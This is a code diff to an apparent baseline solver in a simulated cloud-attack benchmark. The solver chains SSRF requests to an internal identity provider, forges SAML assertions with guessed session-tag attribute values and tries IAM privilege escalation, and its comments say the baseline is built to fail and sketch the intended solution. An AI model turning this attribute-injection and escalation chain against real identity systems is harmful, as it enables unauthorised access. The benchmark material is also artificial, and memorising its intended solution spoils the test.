@@ -179,25 +179,25 @@ def _naive_enumerator(base, budget=400):
                         return True
         return False
 
-    # hop 4+5 SEARCH: spray the real attribute-injection vectors (PrincipalTag / delimited claim) with
-    # COMMON GUESSED values — WITHOUT reading the per-run project code the directory publishes. A session
-    # only carries a tag when the right key is used, and even then a guessed VALUE fails the trust
-    # condition, so escalation never succeeds. (A solver that READS the directory code and connects it
-    # to the IAM condition — the intended, realistic reasoning — does succeed; that is not this baseline.)
-    _PT = "https://aws.amazon.com/SAML/Attributes/PrincipalTag:"
-    _DC = "https://idp.corp.internal/claims/session-tags"
-    for tag in _GEN_TAGS:
+    # hop 4 SEARCH: read the IdP claim rules (schema-aware) and spray each SOURCE attribute with COMMON
+    # GUESSED values — WITHOUT correlating the directory /dir/projects catalog to the trust predicate to
+    # find the real per-run project code. The honored source emits the honored tag, but a guessed VALUE
+    # fails the (uniform) trust condition, so escalation never succeeds. (A solver that DOES the
+    # correlation — the intended realistic reasoning — succeeds in O(1); a blind catalog enumeration
+    # succeeds in O(catalog); this pattern-spray baseline models neither and fails.)
+    rules = ssrf(f"{IDP}/idp/claim-rules")
+    sources = [r.get("source") for r in rules.get("rules", [])] if isinstance(rules, dict) else []
+    for src in sources or ["extensionAttribute7"]:
         for val in _GEN_VALUES:
             if tried >= budget:
                 return False
             tried += 1
-            for attrs in ({_PT + tag: val}, {_DC: f"{tag}={val}"}):
-                a = ssrf(f"{IDP}/idp/assert?p={b64u({'entitlement': ent, 'role': role, 'attributes': attrs})}")
-                if not isinstance(a, dict) or "assertion" not in a:
-                    continue
-                sess = ssrf(f"{IAM}/iam/session?assertion={a['assertion']}")
-                if isinstance(sess, dict) and sess.get("tags") and _escalate(sess["session"]):
-                    return True
+            a = ssrf(f"{IDP}/idp/assert?p={b64u({'entitlement': ent, 'role': role, 'attributes': {src: val}})}")
+            if not isinstance(a, dict) or "assertion" not in a:
+                continue
+            sess = ssrf(f"{IAM}/iam/session?assertion={a['assertion']}")
+            if isinstance(sess, dict) and sess.get("tags") and _escalate(sess["session"]):
+                return True
     # also try assuming/granting directly on an untagged session (pure role/action brute force)
     a = ssrf(f"{IDP}/idp/assert?p={b64u({'entitlement': ent, 'role': role, 'attributes': {}})}")
     if isinstance(a, dict) and "assertion" in a:
